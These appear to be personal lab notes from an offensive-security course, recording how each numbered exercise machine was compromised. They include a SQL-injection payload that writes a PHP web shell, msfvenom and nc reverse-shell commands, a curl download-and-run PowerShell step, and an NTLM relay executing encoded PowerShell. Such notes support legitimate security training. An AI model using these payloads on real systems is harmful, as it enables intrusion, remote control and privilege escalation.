### 10.3.2.4

added the ip to /etc/hosts
scanned the website using wpscan
exploited sqli using sqlmap
uploaded reverse shell using wordpress plugin
got user as www-root
flag.txt in /var/www

### 10.3.2.5

email subscribe field in home page
boolean based sqli in post request with item mail-list
write php shell to file using sql injection
mail-list=' UNION SELECT null, null, null, null,"<?php echo system($_GET['cmd']);?>", null  INTO OUTFILE "/var/www/html/web1.php" -- //
http://forestsave.lab/web1.php?cmd=cat%20../flag.txt


### 10.3.2.7
SQLi in login 
xp_cmdshell working
uploaded powershell reverse shell and got reverse connection

### 11.3.1.3

Follow the walkthrough

### 12.4.1.1

Mouseserver exploit
49601

### 12.4.1.2

CVE : CVE-2021-41773

### 12.4.1.3

all port scan using nmap 
james smtp server running use exploit 50347
change port numbers according to nmap

### 13.2.3.2

same as walkthrough of fixing web exploits
took reverse shell using bash one liner reverse shell passing in cmd param

### 13.2.3.3
directory brute force with common.txt and big.txt no results

used exploit 46481 and used any jpeg image

### 13.2.3.4

found port 20000
enumerated port further with nmap -A and nmap -sV
easy chat server running 
tried with application locally
only changed payload with stageless reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.217 LPORT=1990 -f python -b "\x00\x20" -v shellcode
fire

### 14.3.3.2

used shellter as mentioned in walkthrough

### 14.3.3.4

created a bat file to download powershell script and then execute it
since the script is in 32 bit, faced problem in executing because powershell cmd spawns 64 bit so used following
curl http://192.168.1.11:9090/exec.ps1 -o exec.ps1
%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -exec bypass .\exec.ps1
![[exec.ps1]]

### 15.3.3

same as given in walkthrough
use unc path for file upload after setting up responder
//192.168.45.230/share/ack1.php

### 15.3.4.1
same as walkthrough 
powershell encoding is tricky
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.221.212 -c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFM

### 15.3.4.2

same as above with command injection

### 16.3.2.2

Found alex password in notes
Found enterpriseservice
placed dll in the folder with powershell one line base64 encoded, meterpreter payload was not working
got reverse connection
uploaded meterpreter exe
uploaded god potato and executed nc 
GodPotato-NET4.exe -cmd "C:\Services\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.186 1234"


